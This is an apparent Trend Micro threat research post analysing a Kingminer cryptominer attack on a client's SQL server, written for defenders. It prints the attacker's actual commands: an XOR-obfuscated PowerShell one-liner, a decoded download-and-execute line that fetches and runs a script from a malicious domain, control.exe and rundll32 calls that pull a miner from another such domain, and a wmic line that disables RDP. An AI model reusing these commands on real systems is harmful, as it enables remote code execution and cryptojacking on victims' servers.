	<h1 class="article-details__title">Uncovering a Kingminer Botnet Attack Using Trend Micro™ Managed XDR</h1>
	<p class="article-details__description">Trend Micro’s Managed XDR team addressed a Kingminer botnet attack conducted through an SQL exploit. We discuss our findings and analysis in this report.</p>
	<p class="article-details__author-by">By: Buddy Tancio, Jed Valderama
		
			<time class="article-details__date">May 18, 2022</time>
		
		
		<span>Read time:&nbsp;</span><span class="eta"></span> (<span class="words"></span> words)
	</p>

            <div class="richText">
	
    


	
		<div>
			<p>We observed malicious activities in a client’s SQL server that flagged a potential exploit in one public-facing device. A quick look at the Trend Micro Vision One™ Workbench showed that a Microsoft SQL server process created an obfuscated <a href="https://www.trendmicro.com/vinfo/ph/security/news/cybercrime-and-digital-threats/tracking-detecting-and-thwarting-powershell-based-malware-and-attacks" target="_self">PowerShell</a> command. This suggested that the machine had been compromised, prompting us to investigate further.</p>
<p>The tactics, techniques, and procedures (TTPs) discussed here reflect many of the TTPs that threat researchers have identified with the Kingminer botnet. According to <a href="https://www.bankinfosecurity.com/kingminer-botnet-targeting-sql-servers-for-cryptomining-a-14412" target="_blank">reports</a> in mid-2020, malicious actors deployed Kingminer to target SQL servers for cryptocurrency mining. Threat analysts have also documented <a href="https://www.zdnet.com/article/kingminer-cryptojacker-returns-now-new-and-improved/" target="_blank">known activities</a> of the Kingminer botnet operators in November 2018 and their <a href="https://blog.360totalsecurity.com/en/weak-password-was-blasted-again-kingminer-mining-new-trojan-variant-online/" target="_blank">reemergence</a> in July 2019. Our recent detections therefore suggest the apparent resurgence of the malware that exploits systems with known, unpatched vulnerabilities. We discuss our findings in the following section.</p>

		</div>
	

</div>
            <div class="image">
	
    


	<figure class="image-figure">
		
			<img src="/content/dam/trendmicro/global/en/research/22/e/uncovering-a-kingminer-botnet-attack-using-trend-micro-managed-xdr/kingminer01.png" alt="Figure 1. Trend Micro Vision One Workbench detection for the malicious SQL activity"/>
		
		<div class="caption-image-container ">
			<figcaption>Figure 1. Trend Micro Vision One Workbench detection for the malicious SQL activity</figcaption>
			
		</div>
	</figure>

</div>
            <div>




    
    
    <div class="richText">
	
    


	
		<div>
			<p><b>Investigation and analysis</b></p>
<p>We observed a <a href="https://www.techopedia.com/definition/22809/visual-basic-script-vbscript" target="_blank">VBScript</a> file named %PUBLIC%\gfghhjhyuq.vbs executed through <a href="https://docs.microsoft.com/en-us/sql/tools/sqlservr-application?view=sql-server-ver15" target="_blank">sqlservr.exe</a>. This led us to suspect that the device had been exploited through a vulnerability that allowed malicious actors to execute arbitrary codes remotely. The sqlservr process handles the requests received by an MSSQL database</p>

		</div>
	

</div>


    
    
    <div class="image">
	
    


	<figure class="image-figure">
		
			<img src="/content/dam/trendmicro/global/en/research/22/e/uncovering-a-kingminer-botnet-attack-using-trend-micro-managed-xdr/kingminer02.png" alt="Figure 2. Trend Micro Vision One™ execution profile of sqlservr.exe using PowerShell to run gfghhjhyuq.vbs"/>
		
		<div class="caption-image-container ">
			<figcaption>Figure 2. Trend Micro Vision One™ execution profile of sqlservr.exe using PowerShell to run gfghhjhyuq.vbs</figcaption>
			
		</div>
	</figure>

</div>


    
    
    <div class="richText">
	
    


	
		<div>
			<p>We collected the gfghhjhyuq.vbs file using Trend Micro Vision One to probe further. Despite the script being obfuscated, we were able to uncover most of its functions by decoding the hex string parameters. We describe the chain of events in the following section.</p>
<p>The file first checks for the operating system version through a <a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page" target="_blank">WMI</a> object. It then proceeds to download a 32-bit or 64-bit payload depending on the installed Windows version.</p>

		</div>
	

</div>


    
    
    <div class="image">
	
    


	<figure class="image-figure">
		
			<img src="/content/dam/trendmicro/global/en/research/22/e/uncovering-a-kingminer-botnet-attack-using-trend-micro-managed-xdr/kingminer03------------------------gtc.jpg" alt="Figure 3. Partially decoded gfghhjhyuq.vbs used to check the operating system version through a WMI object"/>
		
		<div class="caption-image-container ">
			<figcaption>Figure 3. Partially decoded gfghhjhyuq.vbs used to check the operating system version through a WMI object</figcaption>
			
		</div>
	</figure>

</div>


    
    
    <div class="richText">
	
    


	
		<div>
			<p>Next, it downloads a standalone PowerShell binary from a raw file stored in a GitHub user’s repository. Afterward, it saves and executes it as %PUBLIC%\{timestamp}\sysdo.exe.</p>

		</div>
	

</div>


    
    
    <div class="image">
	
    


	<figure class="image-figure">
		
			<img src="/content/dam/trendmicro/global/en/research/22/e/uncovering-a-kingminer-botnet-attack-using-trend-micro-managed-xdr/Kingminer04.jpg" alt=" Figure 4. Downloading of 32-bit or 64-bit PowerShell binary from a GitHub repository"/>
		
		<div class="caption-image-container ">
			<figcaption> Figure 4. Downloading of 32-bit or 64-bit PowerShell binary from a GitHub repository</figcaption>
			
		</div>
	</figure>

</div>


    
    
    <div class="image">
	
    


	<figure class="image-figure">
		
			<img src="/content/dam/trendmicro/global/en/research/22/e/uncovering-a-kingminer-botnet-attack-using-trend-micro-managed-xdr/kingminer05.jpg" alt="Figure 5. PowerShell binary copied as sysdo.exe and executed"/>
		
		<div class="caption-image-container ">
			<figcaption>Figure 5. PowerShell binary copied as sysdo.exe and executed</figcaption>
			
		</div>
	</figure>

</div>


    
    
    <div class="richText">
	
    


	
		<div>
			<p>Following this, it generates the URL where additional PowerShell scripts will be downloaded. The scripts are then executed filelessly using <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2" target="_blank">Invoke-Expression</a>.</p>

		</div>
	

</div>


    
    
    <div class="image">
	
    


	<figure class="image-figure">
		
			<img src="/content/dam/trendmicro/global/en/research/22/e/uncovering-a-kingminer-botnet-attack-using-trend-micro-managed-xdr/kingminer06.jpg" alt="Figure 6. Generating URLs for download and fileless execution of additional PowerShell scripts"/>
		
		<div class="caption-image-container ">
			<figcaption>Figure 6. Generating URLs for download and fileless execution of additional PowerShell scripts</figcaption>
			
		</div>
	</figure>

</div>


    
    
    <div class="richText">
	
    


	
		<div>
			<p>Finally, it runs a cryptocurrency miner payload through a Control Panel item.</p>

		</div>
	

</div>


    
    
    <div class="image">
	
    


	<figure class="image-figure">
		
			<img src="/content/dam/trendmicro/global/en/research/22/e/uncovering-a-kingminer-botnet-attack-using-trend-micro-managed-xdr/kingminer07.jpg" alt="Figure 7. Execution of cryptocurrency miner through a Control Panel item"/>
		
		<div class="caption-image-container ">
			<figcaption>Figure 7. Execution of cryptocurrency miner through a Control Panel item</figcaption>
			
		</div>
	</figure>

</div>


    
    
    <div class="richText">
	
    


	
		<div>
			<p>Security teams can clearly see and monitor the chain of events in Vision One. After the cryptocurrency miner is executed through the Control Panel item, sqlservr.exe calls C:\Windows\Temp\sysdo.exe (renamed as PowerShell binary).</p>

		</div>
	

</div>


    
    
    <div class="image">
	
    


	<figure class="image-figure">
		
			<img src="/content/dam/trendmicro/global/en/research/22/e/uncovering-a-kingminer-botnet-attack-using-trend-micro-managed-xdr/kingminer08.png" alt="Figure 8. Sysdo.exe (renamed as a PowerShell binary) executing the following obfuscated commands directly to memory, detected as Trojan.PS1.MALXMR.PFAIS"/>
		
		<div class="caption-image-container ">
			<figcaption>Figure 8. Sysdo.exe (renamed as a PowerShell binary) executing the following obfuscated commands directly to memory, detected as Trojan.PS1.MALXMR.PFAIS</figcaption>
			
		</div>
	</figure>

</div>


    
    
    <div class="richText">
	
    


	
		<div>
			<blockquote><i>&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot; -c &quot;$p='b3f8b7aab7d9f2e0bad8f5fdf2f4e3b7bad4f8fad8f5fdf2f4e3b7dae4effafba5b9cfdadbdfc3c3c7acb3f8b9d8e7f2f9bfb0d0d2c3b0bbb0ffe3e3e7adb8b8e0e0b9a4a6a6a4f4f1f3f6f2b9f4f8fab8f2f5b9e3efe3b0bbb7b3d1f6fbe4f2beacb3f8b9c4f2f9f3bfbeacb3e7aab3f8b9e5f2e4e7f8f9e4f2c3f2efe3acccc4eee4e3f2fab9c3f2efe3b9d2f9f4f8f3fef9f0caadadd6e4f4fefeb9d0f2e3c4e3e5fef9f0bfccd4f8f9e1f2e5e3caadadd1e5f8fad5f6e4f2a1a3c4e3e5fef9f0bfb3e7bebeebb1bfd0d6dbb7debdcfbeacf9f2feb7b7bac7d2c7f6e3ffb7f1f1f1f1b7baf9fef4b7e3fc';$p = for($i=0; $i -lt $p.length; $i+=2){[char](([byte][char][int]::Parse($p.substring($i,2),'HexNumber')) -bxor 151)};$p=(-join $p) -join ' ';$p|&amp;(GAL I*X)&quot;</i></blockquote>
<p>Upon checking the Windows Antimalware Scan Interface (AMSI) telemetry through Vision One, we saw the decoded PowerShell command lines. These connect to http://ww[.]3113cfdae.com/eb[.]txt th</p>
<blockquote><i>$o = New-Object -ComObject Msxml2.XMLHTTP;$o.Open('GET','http://ww.3113cfdae.com/eb.txt', $False);$o.Send();$p</i></blockquote>
<blockquote><i>=$o.responseText;[System.Text.Encoding]::Ascii.GetString([Convert]::FromBase64String($p))|&amp;(GAL I*X);nei  -PEP</i></blockquote>
<blockquote><i>ath ffff -nic tk</i></blockquote>
<p>Similar to what we saw in our analysis of the file gfghhjhyuq.vbs script, it has also been observed through Vision One that sysdo.exe invoked <a href="https://answers.microsoft.com/en-us/windows/forum/all/what-is-rundll32exe/5f707fc5-d78b-4cdd-a5d0-bb0c4b80c3a8" target="_blank">rundll32</a> using a <a href="https://support.microsoft.com/en-us/topic/description-of-control-panel-cpl-files-4dc809cd-5063-6c6d-3bee-d3f18b2e0176" target="_blank">main.cpl</a>, which is a Microsoft Module for the functionality of the mouse. The malicious actor used this module to launch the payload directly onto the device’s memory that connects to known malicious domain, http://qqqe[.]1eaba4fdae[.]com, to download additional components.</p>
<blockquote><i>&quot;C:\Windows\System32\control.exe&quot; &quot;C:\Windows\system32\main.cpl&quot; -QmDvMERT99 http://qqqe.1eaba4fdae.com/ -ming day2 -PRHVoCqZ99</i></blockquote>
<blockquote><i>&quot;C:\Windows\system32\rundll32.exe&quot; Shell32.dll,Control_RunDLL &quot;C:\Windows\system32\main.cpl&quot; -QmDvMERT99 http://qqqe.1eaba4fdae.com/ -ming day2 -PRHVoCqZ99I*X)&quot;</i></blockquote>

		</div>
	

</div>


    
    
    <div class="image">
	
    


	<figure class="image-figure">
		
			<img src="/content/dam/trendmicro/global/en/research/22/e/uncovering-a-kingminer-botnet-attack-using-trend-micro-managed-xdr/kingminer09.png" alt="Figure 9. Process tree of Control Panel item execution as seen in the Vision One console"/>
		
		<div class="caption-image-container ">
			<figcaption>Figure 9. Process tree of Control Panel item execution as seen in the Vision One console</figcaption>
			
		</div>
	</figure>

</div>


    
    
    <div class="richText">
	
    


	
		<div>
			<p>We noticed additional PowerShell executions spawned by sqlservr.exe. These were executed by the previously dropped sysdo.exe file. There are two commands here: One checks if the installed version of Windows is from Windows 2000 to Windows 7. Secondly, it checks separately if hotfixes <a href="https://support.microsoft.com/en-us/topic/may-14-2019-kb4499175-security-only-update-4633b67f-f683-7731-f332-e1e7ec35bfc5">KB4499175</a> (Windows 7 SP1) and <a href="https://support.microsoft.com/en-us/topic/description-of-the-security-update-for-the-remote-code-execution-vulnerability-in-windows-xp-sp3-windows-server-2003-sp2-windows-server-2003-sp2-r2-windows-xp-professional-x64-edition-sp2-windows-xp-embedded-sp3-windows-embedded-posready-2009-and-windows-embedded-standard-2009-39312e24-7af0-6156-0b6a-ccf3e65777e8">KB4500331</a> (Windows XP, Windows Server 2003 SP2) are installed. If it finds that none of the hotfixes is present, this means that it is vulnerable to the BlueKeep vulnerability assigned as <a href="https://nvd.nist.gov/vuln/detail/cve-2019-0708" target="_blank">CVE-2019-0708</a>. If both commands yield negative results, the script disables RDP and the cryptocurrency miner proceeds to its infection routine.</p>
<blockquote><i>&quot;C:\Windows\system32\cmd.exe&quot; /c cmd /c ver |findstr &quot;5.0 5.1 5.2 6.0 6.1&quot;&amp;&amp;wmic qfe GET hotfixid |findstr /i &quot;kb4499175 kb4500331&quot;||wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 0</i></blockquote>

<p><b>Discovering vulnerabilities</b></p>
<p>Using a search engine for internet of things (IoT) devices like Shodan and Censys, the team was able to both see exposed services such as RDP and SQL and validate missing patches on any machine. One of the vulnerabilities we found traces back to 2014. </p>

		<div>
			<p>Notably, after we detected fgfghhjhyuq.vbs (detected as Trojan.VBS.MALXMR.AS), we continued to observe more attempts to drop malware on the same server. It’s important to note that although the malicious actor was unable to execute the malware, such attempts did not stop since the vulnerability was still there. Only after the vulnerability was patched did the attempts cease.</p>
<p><b>Conclusion and security recommendations</b></p>
<p>While measures for signature detection are in place to shield an organization’s network from breaches, security teams should still prioritize the identification of vulnerabilities on their servers and endpoints and make sure that these are immediately patched. Doing so is even more crucial for public-facing systems. Adopting a proactive cybersecurity mindset is essential for an organization to thrive as the conduct of business in the digital space deepens and grows.</p>
<p>It is recommended that organizations deploy intrusion detection systems such as <a href="https://www.trendmicro.com/en_us/business/products/network/advanced-threat-protection/inspector.html" target="_blank">Trend Micro™ Deep Discovery™ Inspector</a> as a preventive measure. This is relevant to the case discussed here. Since we did not have network-level visibility, we only relied on endpoint-level data to investigate and respond to the threat. Implementing network monitoring allows security professionals to detect specific server-related vulnerabilities that the malicious actors might abuse, in addition to being able to scope out all affected machines on the network. A reliable intrusion detection system would also be a useful tool for monitoring and investigating ongoing attacks since it can provide historical logs of activities in an organization’s network.</p>
